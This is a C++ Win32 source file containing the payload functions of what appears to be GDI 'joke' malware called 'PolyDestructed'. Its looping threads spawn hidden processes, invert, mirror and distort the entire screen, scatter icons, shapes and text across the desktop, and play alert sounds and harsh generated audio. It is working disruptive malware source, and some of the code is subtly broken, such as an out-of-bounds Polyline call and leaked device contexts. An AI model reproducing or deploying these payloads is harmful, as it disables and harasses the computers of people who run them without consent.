DWORD WINAPI shell1(LPVOID lOpen) {
	int programs = 6;
	{
		int rndprg = rand () % (programs + 1);
		while (1) {
			
		
		if (rndprg == 1) {
			ShellExecuteA(NULL, "open", "C:\\WINDOWS\\notepad.exe", NULL, NULL, SW_HIDE);
		}
		if (rndprg == 2) {
			ShellExecuteA(NULL, "open", "C:\\WINDOWS\\system32\\mspaint.exe", NULL, NULL, SW_HIDE);
		}
		if (rndprg == 3) {
			ShellExecuteA(NULL, "open", "C:\\WINDOWS\\explorer.exe", NULL, NULL, SW_HIDE);
		}
		if (rndprg == 4) {
			ShellExecuteA(NULL, "open", "C:\\WINDOWS\\system32\\calc.exe", NULL, NULL, SW_HIDE);
		}
		if (rndprg == 5) {
			ShellExecuteA(NULL, "open", "C:\\WINDOWS\\system32\\winver.exe", NULL, NULL, SW_HIDE);
		}
		if (rndprg == 6) {
			ShellExecuteA(NULL, "open", "C:\\WINDOWS\\explorer.exe", NULL, NULL, SW_HIDE);
		}
		Sleep(10000);
	}
}

}

DWORD CALLBACK Icons(LPVOID lhicon) {
	HDC hdc;
	int sw, sh;
	while (true) {
		hdc = GetDC(NULL);
		sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		DrawIcon(hdc, rand () % sw, rand () % sh, LoadIconA(NULL, IDI_ERROR));
		Sleep(2000);
		DrawIcon(hdc, rand () % sw, rand () % sh, LoadIconA(NULL, IDI_ASTERISK));
		Sleep(2000);
		DrawIcon(hdc, rand () % sw, rand () % sh, LoadIconA(NULL, IDI_APPLICATION));
		Sleep(2000);
		DrawIcon(hdc, rand () % sw, rand () % sh, LoadIconA(NULL, IDI_QUESTION));
		ReleaseDC(NULL, hdc);
		Sleep(2000);
	}
}

DWORD CALLBACK CursorDraw(LPVOID cur) {
	POINT cursor;
	HDC hdc;
	int iw, ih;
	while (true) {
		GetCursorPos(&cursor);
		hdc = GetDC(NULL);
		iw = GetSystemMetrics(SM_CXICON), ih = GetSystemMetrics(SM_CYICON);
		DrawIcon(hdc, cursor.x - iw, cursor.y - ih, LoadIconA(NULL, IDI_EXCLAMATION));
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}

DWORD CALLBACK PatBlt1(LPVOID parameter) {
	HDC hdc;
	int sw, sh;
	HBRUSH hbr;
	while (true) {
		hdc = GetDC(NULL);
		sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		hbr = CreateSolidBrush(RGB(rand () % 75, rand () % 75, rand () % 75));
		SelectObject(hdc, hbr);
		PatBlt(hdc, 0, 0, sw, sh, PATINVERT);
		DeleteObject(hbr);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}

DWORD CALLBACK MirrorScreen(LPVOID mirror) {
	HDC hdc, hmem;
	int sw, sh;
	HBITMAP bmp;
	while (true) {
		hdc = GetDC(NULL), hmem = CreateCompatibleDC(hdc);
		sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		bmp = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hmem, bmp);
		BitBlt(hmem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		StretchBlt(hdc, 0, 0, sw, sh, hdc, sw, 0, -sw, sh, SRCCOPY);
		Sleep(10);
	}
}

DWORD CALLBACK PatBit(LPVOID parameter) {
	HDC hdc;
	int sw, sh;
	HBRUSH hbr;
	while (true) {
		hdc = GetDC(NULL);
		sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		hbr = CreateSolidBrush(RGB(rand () % 255, rand () % 255, rand () % 255));
		SelectObject(hdc, hbr);
		PatBlt(hdc, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, rand () % 20, rand () % 20, sw, sh, hdc, rand () % 20, rand () % 20, SRCCOPY);
		DeleteObject(hbr);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}

DWORD CALLBACK Tunneling(LPVOID lt) {
	HDC hdc;
	int sw, sh;
	while (true) {
		hdc = GetDC(NULL);
		sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		StretchBlt(hdc, 40, 40, sw - 80, sh - 80, hdc, 0, 0, sw, sh, SRCCOPY);
		BitBlt(hdc, rand () % 10, rand () % 10, sw, sh, hdc, rand () % 10, rand () % 10, NOTSRCERASE);
		ReleaseDC(NULL, hdc);
		Sleep(250);
	}
}

DWORD CALLBACK PolyShapes(LPVOID poly) {
	// polyfuck
	HDC hdc;
	int sw, sh;
	HPEN h;
	HBRUSH hb;
	while (true) {
		hdc = GetDC(NULL);
		sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		POINT vertices[] = {{rand () % sw, rand () % sh}, {rand () % sw, rand () % sh}, {rand () % sw, rand () % sh}};
		h = CreatePen(PS_SOLID, 5, RGB(rand () % 239, rand () % 239, rand () % 239));
		SelectObject(hdc, h);
		Polyline(hdc, vertices, 4);
		DeleteObject(h);
		hb = CreateSolidBrush(RGB(rand () % 239, rand () % 239, rand () % 239));
		SelectObject(hdc, hb);
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
		DeleteObject(hb);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}

DWORD CALLBACK InvCC(LPVOID linv) {
	HDC hdc;
	HRGN hrgn;
	int sw, sh;
	int rw, rh;
	int tw, th, bw, bh;
	while (true) {
		hdc = GetDC(NULL);
		sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		rw = rand () % sw, rh = rand () % sh;
		tw = rw + 0, th = rh + 0, bw = rw + 100, bh = rh + 100;
		hrgn = CreateRectRgn(tw, th, bw, bh);
		InvertRgn(hdc, hrgn);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}

DWORD CALLBACK TextOuts(LPVOID lpstr) {
	HDC hdc;
	int sw, sh;
	HFONT hfnt;
	LPCSTR lpString;
	while (true) {
		hdc = GetDC(NULL);
		sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		hfnt = CreateFontA(10, 10, rand () % 360, 0, FW_EXTRALIGHT, true, false, false, ANSI_CHARSET, 0, 0, 0, 0, "Times New Roman");
		lpString = "PolyDestructed";
		SelectObject(hdc, hfnt);
		SetTextColor(hdc, RGB(rand () % 255, rand () % 255, rand () % 255));
		TextOutA(hdc, rand () % sw, rand () % sh, lpString, strlen(lpString));
		DeleteObject(hfnt);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}

DWORD __stdcall wSound1(LPVOID l) {
	while (true) {
		PlaySoundA("SystemHand", NULL, SND_ALIAS | SND_ASYNC);
		Sleep(3000);
	}
}

DWORD __stdcall wSound2(LPVOID l) {
	while (true) {
		PlaySoundA("SystemExclamation", NULL, SND_ALIAS | SND_ASYNC);
		Sleep(3000);
	}
}

DWORD __stdcall wSound3(LPVOID l) {
	while (true) {
		PlaySoundA("SystemDefault", NULL, SND_ALIAS | SND_ASYNC);
		Sleep(3000);
	}
}

void Sound1() {
	HWAVEOUT wave = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&wave, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t/8>>t/8)&50);

	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(wave, &hdr, sizeof(WAVEHDR));
	waveOutWrite(wave, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(wave, &hdr, sizeof(WAVEHDR));
	waveOutClose(wave);
}

void Sound2() {
	HWAVEOUT wave = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&wave, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 35] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t*(3+(1^t>>10&5))*(5+(3&t>>14)))/16*cos(t>>9));

	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(wave, &hdr, sizeof(WAVEHDR));
	waveOutWrite(wave, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(wave, &hdr, sizeof(WAVEHDR));
	waveOutClose(wave);
}

void Sound3() {
	HWAVEOUT wave = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&wave, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 38] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(4*t*cos(t>>10)+t);

	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(wave, &hdr, sizeof(WAVEHDR));
	waveOutWrite(wave, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(wave, &hdr, sizeof(WAVEHDR));
	waveOutClose(wave);
}

VOID WINAPI dt(HANDLE h) {
	TerminateThread(h, 0);
	CloseHandle(h);
}
